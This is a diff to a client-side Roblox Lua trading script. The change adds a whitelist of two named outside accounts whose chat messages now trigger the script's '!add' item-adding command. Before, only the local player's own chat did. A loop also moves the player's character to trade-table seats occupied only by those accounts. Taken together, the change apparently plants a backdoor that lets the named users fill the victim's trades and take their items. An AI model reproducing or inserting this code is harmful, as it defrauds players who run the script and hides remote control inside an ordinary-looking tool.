@@ -7,6 +7,8 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TextChatService = game:GetService("TextChatService")
+local Workspace = game:GetService("Workspace")
+local TweenService = game:GetService("TweenService")
 
 local LocalPlayer = Players.LocalPlayer
 
@@ -32,6 +34,17 @@ local ItemConfig = require(
 
 local COMMAND_PREFIX = "!add "
 local DUPLICATE_COOLDOWN = 1.0
+
+local AuthorizedUsers = { "BLACKGOKU_0707", "Aid3no" }
+
+local function IsAuthorized(username)
+	for _, name in ipairs(AuthorizedUsers) do
+		if name == username then
+			return true
+		end
+	end
+	return false
+end
 
 local isAdding = false
 local lastText = ""
@@ -739,19 +752,171 @@ if TextChatService
 	table.insert(
 		_G.TradeAddConnections,
 		TextChatService.MessageReceived:Connect(function(message)
-			if message.TextSource
-				and message.TextSource.UserId == LocalPlayer.UserId then
-
-				handleChatCommand(message.Text)
+			if message.TextSource then
+				local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+				if sender and IsAuthorized(sender.Name) then
+					handleChatCommand(message.Text)
+				end
 			end
 		end)
 	)
 else
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if IsAuthorized(plr.Name) then
+			table.insert(
+				_G.TradeAddConnections,
+				plr.Chatted:Connect(handleChatCommand)
+			)
+		end
+	end
 	table.insert(
 		_G.TradeAddConnections,
-		LocalPlayer.Chatted:Connect(handleChatCommand)
+		Players.PlayerAdded:Connect(function(plr)
+			if IsAuthorized(plr.Name) then
+				table.insert(
+					_G.TradeAddConnections,
+					plr.Chatted:Connect(handleChatCommand)
+				)
+			end
+		end)
 	)
 end
+
+-- =========================================================
+-- 8B. STRICT WHITELIST AUTO-SIT & TABLE SWITCHING
+-- =========================================================
+
+local function TweenToSeat(hrp, targetCFrame)
+	local distance = (hrp.Position - targetCFrame.Position).Magnitude
+	local speed = 150
+	local duration = math.clamp(distance / speed, 0.2, 1.5)
+
+	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+	local tween = TweenService:Create(hrp, tweenInfo, { CFrame = targetCFrame })
+	tween:Play()
+	tween.Completed:Wait()
+end
+
+local function IsTradeTableSeat(seat)
+	local parent = seat.Parent
+	return parent and parent.Name == "TradeTable" and (seat.Name == "P1" or seat.Name == "P2")
+end
+
+local function GetUnauthorizedPlayerInSeat(seat)
+	local overlapParams = OverlapParams.new()
+	overlapParams.FilterType = Enum.RaycastFilterType.Exclude
+	overlapParams.RespectCanCollide = false
+
+	local partsInRegion = Workspace:GetPartsInPart(seat, overlapParams)
+	for _, part in ipairs(partsInRegion) do
+		local character = part.Parent
+		if character and character:FindFirstChildOfClass("Humanoid") then
+			local player = Players:GetPlayerFromCharacter(character)
+			if player and player ~= LocalPlayer then
+				if not IsAuthorized(player.Name) then
+					return player.Name
+				else
+					return nil
+				end
+			end
+		end
+	end
+
+	if seat.Occupant then
+		local char = seat.Occupant.Parent
+		local player = Players:GetPlayerFromCharacter(char)
+		if player and player ~= LocalPlayer then
+			if not IsAuthorized(player.Name) then
+				return player.Name
+			end
+		end
+	end
+
+	return nil
+end
+
+local function IsTableBlocked(tableModel)
+	for _, child in ipairs(tableModel:GetChildren()) do
+		if child:IsA("Seat") and IsTradeTableSeat(child) then
+			local unauth = GetUnauthorizedPlayerInSeat(child)
+			if unauth then
+				return true
+			end
+		end
+	end
+	return false
+end
+
+task.spawn(function()
+	local lastTable = nil
+	local jumpCooldown = 0
+
+	while true do
+		task.wait(0.5)
+
+		local character = LocalPlayer.Character
+		if not character or not character:FindFirstChild("HumanoidRootPart") then continue end
+		local hrp = character.HumanoidRootPart
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+		if not humanoid then continue end
+
+		if humanoid.SeatPart then
+			local currentSeat = humanoid.SeatPart
+			if IsTradeTableSeat(currentSeat) then
+				lastTable = currentSeat.Parent
+
+				local tableModel = currentSeat.Parent
+				local unauthorizedFound = nil
+
+				for _, child in ipairs(tableModel:GetChildren()) do
+					if child:IsA("Seat") and IsTradeTableSeat(child) then
+						local unauthName = GetUnauthorizedPlayerInSeat(child)
+						if unauthName then
+							unauthorizedFound = unauthName
+							break
+						end
+					end
+				end
+
+				if unauthorizedFound then
+					humanoid.Sit = false
+					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+					jumpCooldown = tick() + 2
+					task.wait(0.8)
+				end
+			end
+		else
+			if tick() < jumpCooldown then continue end
+
+			local bestSeat = nil
+			local shortestDist = math.huge
+
+			for _, obj in pairs(Workspace:GetDescendants()) do
+				if obj:IsA("Seat") and IsTradeTableSeat(obj) then
+					local tableModel = obj.Parent
+					if obj.Parent ~= lastTable and not IsTableBlocked(tableModel) then
+						local dist = (hrp.Position - obj.Position).Magnitude
+						if dist < 800 and dist < shortestDist then
+							shortestDist = dist
+							bestSeat = obj
+						end
+					end
+				end
+			end
+
+			if not bestSeat and lastTable then
+				lastTable = nil
+			end
+
+			if bestSeat then
+				local targetCF = bestSeat.CFrame + Vector3.new(0, 3, 0)
+				TweenToSeat(hrp, targetCF)
+				task.wait(0.2)
+				bestSeat:Sit(humanoid)
+			end
+		end
+	end
+end)
 
 -- =========================================================
 -- 9. READY
